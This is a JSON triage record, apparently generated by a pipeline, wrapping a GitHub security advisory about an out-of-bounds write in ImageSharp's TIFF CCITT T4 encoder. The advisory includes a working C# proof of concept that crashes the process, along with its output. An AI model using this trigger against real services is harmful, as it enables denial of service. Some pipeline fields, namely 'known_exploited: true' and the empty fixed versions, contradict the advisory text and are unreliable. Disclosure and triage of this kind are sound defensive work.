@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 6, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2505339?v=4\", \"events_url\": \"https://api.github.com/users/MegaManSec/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/MegaManSec/followers\", \"following_url\": \"https://api.github.com/users/MegaManSec/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/MegaManSec/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/MegaManSec\", \"id\": 2505339, \"login\": \"MegaManSec\", \"node_id\": \"MDQ6VXNlcjI1MDUzMzk=\", \"organizations_url\": \"https://api.github.com/users/MegaManSec/orgs\", \"received_events_url\": \"https://api.github.com/users/MegaManSec/received_events\", \"repos_url\": \"https://api.github.com/users/MegaManSec/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/MegaManSec/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/MegaManSec/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/MegaManSec\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-106110\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-787\", \"name\": \"Out-of-bounds Write\"}], \"description\": \"### Summary\\n\\nImageSharp's TIFF CCITT Group 3 (T4) encoder can write beyond its allocated compressed-data buffer when encoding narrow 1-bit images. The unchecked writes can corrupt process memory and terminate the process.\\n\\nThis report concerns only the T4 `CcittGroup3Fax` encoder path. It replaces the prior, unrelated ICC content.\\n\\n### Affected package and versions\\n\\n- Package: `SixLabors.ImageSharp` (NuGet)\\n- Affected range: `>= 2.0.0, <= 4.1.1`\\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\\n\\nThe T4 encoder and its undersized buffer calculation first shipped in v2.0.0. The narrow-image exploit terminates published v2.0.0 and v4.1.1 while the same-height 64-pixel control succeeds on both. Every release through v4.1.1 retains the vulnerable allocation and unchecked bit-write structure.\\n### Preconditions and impact\\n\\nThe affected path is reached when the application encodes 1-bit image data with `TiffCompression.CcittGroup3Fax`. This can happen when an application explicitly selects `TiffEncoder.BitsPerPixel = Bit1` and `TiffEncoder.Compression = CcittGroup3Fax`. It can also occur when an application decodes a TIFF and re-encodes it using the default `TiffEncoder`, because ImageSharp retains TIFF frame metadata including the compression and bit depth.\\n\\n`TiffCompressorFactory` creates `T4BitCompressor` for `CcittGroup3Fax`. `TiffCcittCompressor.Initialize` allocates `Width * rowsPerStrip` bytes, but non-modified T4 writes a 12-bit EOL before row data and an additional 12-bit EOL per row. `WriteCode` calls `BitWriterUtils.WriteBit` and `WriteZeroBit`, both of which use `Unsafe.Add` without a capacity check. Thus the encoded bit stream can exceed the allocated span.\\n\\nA 1-pixel-wide, 2000-row alternating bilevel image caused a fatal `System.AccessViolationException` during T4 compression. This is a memory-corruption and availability issue for applications that expose this encoding flow to attacker-controlled input.\\n\\n### Tested environment\\n\\n- Package binary: NuGet `SixLabors.ImageSharp` **4.1.1**\\n- Target framework: `net8.0`\\n- Runtime: .NET 8.0.30; SDK 8.0.424\\n- Operating system: Debian GNU/Linux 12 (bookworm), Linux arm64, Docker\\n\\nNo active exploitation is known.\\n\\n### Reproduction\\n\\nIn a `net8.0` project that references the published `SixLabors.ImageSharp` 4.1.1 binary, save the following as `Program.cs`. Run `dotnet run -- exploit 2000` for the trigger and `dotnet run -- control 2000` for the control.\\n\\n```csharp\\nusing System;\\nusing System.IO;\\nusing SixLabors.ImageSharp;\\nusing SixLabors.ImageSharp.Formats.Tiff;\\nusing SixLabors.ImageSharp.Formats.Tiff.Constants;\\nusing SixLabors.ImageSharp.PixelFormats;\\n\\nstring mode = args.Length > 0 ? args[0] : \\\"exploit\\\";\\nint width = mode == \\\"control\\\" ? 64 : 1;\\nint height = args.Length > 1 ? int.Parse(args[1]) : 2000;\\n\\nConsole.WriteLine($\\\"mode={mode} width={width} height={height}\\\");\\nusing var image = new Image<L8>(width, height);\\nfor (int y = 0; y < image.Height; y++)\\n    for (int x = 0; x < image.Width; x++)\\n        image[x, y] = new L8((byte)(((x + y) & 1) == 0 ? 255 : 0));\\n\\nvar metadata = image.Frames.RootFrame.Metadata.GetTiffMetadata();\\nmetadata.BitsPerPixel = TiffBitsPerPixel.Bit1;\\nmetadata.Compression = TiffCompression.CcittGroup3Fax;\\n\\nusing var output = new MemoryStream();\\nimage.Save(output, new TiffEncoder());\\nConsole.WriteLine($\\\"Encoded OK: {output.Length} bytes\\\");\\n```\\n\\nAgainst the published 4.1.1 package, this produced:\\n\\n```text\\nmode=exploit width=1 height=2000\\nFatal error. System.AccessViolationException: Attempted to read or write protected memory.\\n  at ...TiffCcittCompressor.GetWhiteTermCode(...)\\n  at ...T4BitCompressor.CompressStrip(...)\\n```\\n\\nA 64-pixel-wide, 2000-row control using the same Group 3 metadata completed successfully:\\n\\n```text\\nmode=control width=64 height=2000\\nEncoded OK: 76230 bytes\\n```\\n\\nThe direct public configuration path also triggers with:\\n\\n```csharp\\nnew TiffEncoder\\n{\\n    BitsPerPixel = TiffBitsPerPixel.Bit1,\\n    Compression = TiffCompression.CcittGroup3Fax\\n};\\n```\", \"epss\": {\"percentage\": 0.0035, \"percentile\": 0.26576}, \"ghsa_id\": \"GHSA-j9gm-c75j-xc9q\", \"github_reviewed_at\": \"2026-10-07T20:24:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-j9gm-c75j-xc9q\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-j9gm-c75j-xc9q\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-106110\"}], \"nvd_published_at\": \"2026-10-06T18:16:52Z\", \"published_at\": \"2026-10-07T20:24:28Z\", \"references\": [\"https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-j9gm-c75j-xc9q\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-106110\", \"https://github.com/SixLabors/ImageSharp/pull/3187\", \"https://github.com/SixLabors/ImageSharp/commit/a9498c6db3642ef92c712ebc81e706914ac16a95\", \"https://github.com/SixLabors/ImageSharp/releases/tag/v4.1.2\", \"https://github.com/advisories/GHSA-j9gm-c75j-xc9q\"], \"repository_advisory_url\": \"https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-j9gm-c75j-xc9q\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/SixLabors/ImageSharp\", \"summary\": \"ImageSharp: TIFF CCITT T4 encoder can write past its compressed output buffer\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-07T20:24:29Z\", \"url\": \"https://api.github.com/advisories/GHSA-j9gm-c75j-xc9q\", \"vulnerabilities\": [{\"first_patched_version\": \"4.1.2\", \"package\": {\"ecosystem\": \"nuget\", \"name\": \"SixLabors.ImageSharp\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.0.0, <= 4.1.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-j9gm-c75j-xc9q",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "SixLabors.ImageSharp: >= 2.0.0, <= 4.1.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-106110"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "known_exploited": true,
+    "mitigations": [],
+    "products": [
+      "SixLabors.ImageSharp"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-08T19:16:36.881004Z",
+  "provenance": {
+    "content_sha256": "b2446969344f7271740e2768e1761b8047799fa41cb210de9457465951554965",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-07T20:24:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-j9gm-c75j-xc9q",
+  "status": "active",
+  "title": "ImageSharp: TIFF CCITT T4 encoder can write past its compressed output buffer",
+  "updated_at": "2026-10-07T20:24:29Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-j9gm-c75j-xc9q"
+}
